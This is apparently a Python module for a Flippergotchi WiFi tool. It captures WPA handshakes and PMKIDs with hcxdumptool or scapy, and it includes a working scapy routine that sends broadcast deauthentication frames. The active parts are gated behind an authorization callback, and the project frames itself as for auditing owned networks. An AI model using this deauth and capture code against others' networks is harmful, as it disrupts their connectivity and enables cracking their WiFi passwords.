"""Handshake & PMKID capture for the native WiFi stack.

Two strategies, tried in order:

1. ``hcxdumptool`` -- the preferred, modern path. Targets a single BSSID and
   grabs both PMKID (RSN IE, single-frame, clientless) and the EAPOL 4-way
   handshake into a .pcapng. hcxdumptool itself decides whether to inject;
   we only ever hand it a target after the authorization gate says yes.

2. A scapy-based sniffer (import-guarded) as a fallback: it sniffs EAPOL/beacon
   frames on the monitor iface and -- ONLY when authorized -- sends a few
   targeted deauths to nudge a client into re-associating. Writes a .pcap.

Authorization gate: every active path (deauth/injection) is gated behind an
``is_authorized(bssid, ssid) -> bool`` callable supplied by the caller. If it
returns False (or is absent), capture stays strictly passive -- no deauth, no
injection -- and simply listens. This preserves Flippergotchi's "only attack
networks you own" guarantee.

Nothing here raises: missing tools, no root, or a timeout all yield ``None``.

NEEDS ON-HARDWARE VALIDATION: injection + the exact hcxdumptool CLI flags can
only be confirmed against the Flipper One's MT7921 radio.
"""
from __future__ import annotations

import logging
import os
import shutil
import subprocess
import time

log = logging.getLogger(__name__)

# scapy is optional; the import is guarded so importing this module never
# requires it. The fallback sniffer degrades to None when scapy is absent.
try:  # pragma: no cover - presence depends on the host
    from scapy.all import (  # type: ignore
        Dot11, Dot11Deauth, RadioTap, sendp, sniff, wrpcap,
    )
    _HAVE_SCAPY = True
except Exception:  # noqa: BLE001 - any import error means "no scapy"
    _HAVE_SCAPY = False


def have_hcxdumptool() -> bool:
    return shutil.which("hcxdumptool") is not None


def have_scapy() -> bool:
    return _HAVE_SCAPY


def _captures_dir(cfg) -> str:
    """Resolve (and create) the directory captures are written to."""
    d = getattr(cfg, "capture_dir", "") or ""
    if not d:
        d = os.path.join(os.path.expanduser("~"), ".flippergotchi", "captures")
    d = os.path.expanduser(str(d))
    try:
        os.makedirs(d, exist_ok=True)
    except OSError as exc:
        log.debug("could not create capture dir %s (%s); using /tmp", d, exc)
        d = "/tmp/flippergotchi-captures"
        try:
            os.makedirs(d, exist_ok=True)
        except OSError:
            d = "/tmp"
    return d


def _safe_tag(bssid: str) -> str:
    return "".join(c for c in str(bssid) if c.isalnum()).lower() or "ap"


class HandshakeCapture:
    """Capture WPA handshakes / PMKIDs on a monitor interface.

    Parameters
    ----------
    cfg
        Project Config (read defensively via getattr).
    iface
        The monitor-mode interface name to capture on.
    is_authorized
        Optional ``callable(bssid, ssid) -> bool``. When it returns False (or is
        None), capture is strictly passive: no deauth/injection is performed.
    """

    def __init__(self, cfg, iface: str, is_authorized=None):
        self.cfg = cfg
        self.iface = str(iface or "")
        self._is_authorized = is_authorized

    # -- gate -------------------------------------------------------------
    def _authorized(self, bssid: str, ssid: str) -> bool:
        if self._is_authorized is None:
            return False
        try:
            return bool(self._is_authorized(bssid, ssid))
        except Exception as exc:  # noqa: BLE001 - a broken gate must fail CLOSED
            log.warning("authorization callback raised (%s); treating as DENIED", exc)
            return False

    # -- public -----------------------------------------------------------
    def capture(self, bssid: str, ssid: str = "", timeout: float = 25.0,
                channel: int | None = None):
        """Capture a handshake/PMKID for ``bssid``; return a path or None.

        Active deauth/injection is used only when ``is_authorized`` approves;
        otherwise this passively listens for the configured timeout. Returns
        None on any failure. Never raises.
        """
        if not self.iface or not bssid:
            return None
        try:
            timeout = float(timeout)
        except (TypeError, ValueError):
            timeout = 25.0
        active = self._authorized(bssid, ssid)
        if not active:
            log.info("capture for %s is PASSIVE-only (not an authorized "
                     "/home network): no deauth/injection", bssid)

        try:
            if have_hcxdumptool():
                path = self._capture_hcxdumptool(bssid, timeout, channel, active)
                if path:
                    return path
                log.debug("hcxdumptool produced no capture for %s; trying scapy", bssid)
            if have_scapy():
                return self._capture_scapy(bssid, ssid, timeout, channel, active)
        except Exception as exc:  # noqa: BLE001 - never raise out of capture
            log.warning("native capture for %s failed (%s); no capture", bssid, exc)
            return None
        log.info("no native capture method available (need hcxdumptool or scapy)")
        return None

    # -- hcxdumptool ------------------------------------------------------
    def _capture_hcxdumptool(self, bssid, timeout, channel, active):
        """Run hcxdumptool targeted at one BSSID; return the .pcapng or None.

        NEEDS ON-HARDWARE VALIDATION: flag names differ across hcxdumptool
        major versions; we pass a conservative set and rely on the output file
        existing + being non-empty as the success signal.
        """
        out_dir = _captures_dir(self.cfg)
        out = os.path.join(out_dir, f"hs_{_safe_tag(bssid)}_{int(time.time())}.pcapng")

        # --bpf-style BSSID filter keeps us focused on the one AP. When not
        # authorized we add the read-only/passive flag so hcxdumptool never
        # transmits (no deauth/association attacks).
        args = [
            "hcxdumptool",
            "-i", self.iface,
            "-w", out,
            "--filterlist_ap=" + str(bssid).lower().replace(":", ""),
            "--filtermode=2",        # 2 = filterlist is an allow-list
        ]
        if channel:
            args += ["-c", str(int(channel))]
        if not active:
            # Passive: disable all active attack transmissions.
            args.append("--disable_deauthentication")
            args.append("--disable_disassociation")
            args.append("--disable_ap_attacks")
        # Bound runtime; hcxdumptool's own stop timer plus our subprocess timeout.
        args += ["--stop_after=" + str(max(1, int(timeout)))]

        if shutil.which("hcxdumptool") is None:
            return None
        try:
            subprocess.run(
                args,
                capture_output=True, text=True,
                timeout=timeout + 8.0, check=False,
            )
        except subprocess.TimeoutExpired:
            # Timeout is normal: hcxdumptool may still have written frames.
            log.debug("hcxdumptool timed out for %s (may still have captured)", bssid)
        except (subprocess.SubprocessError, OSError) as exc:  # noqa: BLE001
            log.debug("hcxdumptool failed for %s (%s)", bssid, exc)
            return None
        if os.path.exists(out) and os.path.getsize(out) > 0:
            log.info("hcxdumptool wrote capture %s", out)
            return out
        # Empty/no file -> nothing captured.
        try:
            if os.path.exists(out):
                os.remove(out)
        except OSError:
            pass
        return None

    # -- scapy fallback ---------------------------------------------------
    def _capture_scapy(self, bssid, ssid, timeout, channel, active):
        """Sniff EAPOL on the monitor iface; deauth only when authorized.

        NEEDS ON-HARDWARE VALIDATION.
        """
        if not _HAVE_SCAPY:
            return None
        target = str(bssid).lower()
        collected: list = []

        def _keep(pkt) -> bool:
            try:
                if not pkt.haslayer(Dot11):
                    return False
                d = pkt.getlayer(Dot11)
                macs = {str(getattr(d, a, "") or "").lower()
                        for a in ("addr1", "addr2", "addr3")}
                if target not in macs:
                    return False
                # EAPOL has ethertype 0x888e; PMKID rides in RSN of assoc/EAPOL.
                return pkt.haslayer("EAPOL") or pkt.haslayer("WPA_key")
            except Exception:  # noqa: BLE001
                return False

        def _stop(pkt) -> bool:
            try:
                if _keep(pkt):
                    collected.append(pkt)
                    # Stop once we have a few EAPOL frames (enough for M1+M2).
                    return len(collected) >= 4
            except Exception:  # noqa: BLE001
                pass
            return False

        # Authorized targets get a nudge: a small burst of deauths to elicit a
        # reassociation + fresh 4-way handshake. Gated; passive otherwise.
        if active:
            self._send_deauth(target)

        try:
            sniff(
                iface=self.iface,
                lfilter=_keep,
                stop_filter=_stop,
                timeout=max(1.0, float(timeout)),
                store=True,
                prn=lambda p: collected.append(p) if _keep(p) and p not in collected else None,
            )
        except Exception as exc:  # noqa: BLE001 - sniff can fail w/o monitor mode
            log.debug("scapy sniff failed for %s (%s)", bssid, exc)

        # De-dupe while preserving order.
        uniq = []
        for p in collected:
            if p not in uniq:
                uniq.append(p)
        if not uniq:
            return None

        out_dir = _captures_dir(self.cfg)
        out = os.path.join(out_dir, f"hs_{_safe_tag(bssid)}_{int(time.time())}.pcap")
        try:
            wrpcap(out, uniq)
        except Exception as exc:  # noqa: BLE001
            log.debug("wrpcap failed for %s (%s)", out, exc)
            return None
        if os.path.exists(out) and os.path.getsize(out) > 0:
            log.info("scapy wrote capture %s (%d frames)", out, len(uniq))
            return out
        return None

    def _send_deauth(self, target: str) -> None:
        """Send cfg.deauth_count deauth frames at an AUTHORIZED target.

        Caller has already confirmed authorization. NEEDS ON-HARDWARE
        VALIDATION (requires injection-capable monitor mode).
        """
        if not _HAVE_SCAPY:
            return
        count = getattr(self.cfg, "deauth_count", 5)
        try:
            count = max(0, int(count))
        except (TypeError, ValueError):
            count = 5
        if count == 0:
            return
        try:
            # Broadcast deauth from the AP: reason 7 (class-3 frame from
            # nonassociated STA). addr1=broadcast, addr2/addr3=AP BSSID.
            frame = (
                RadioTap()
                / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=target, addr3=target)
                / Dot11Deauth(reason=7)
            )
            sendp(frame, iface=self.iface, count=count, inter=0.1, verbose=False)
            log.info("sent %d deauth frames to authorized target %s", count, target)
        except Exception as exc:  # noqa: BLE001 - injection may be unsupported
            log.debug("deauth send failed for %s (%s)", target, exc)
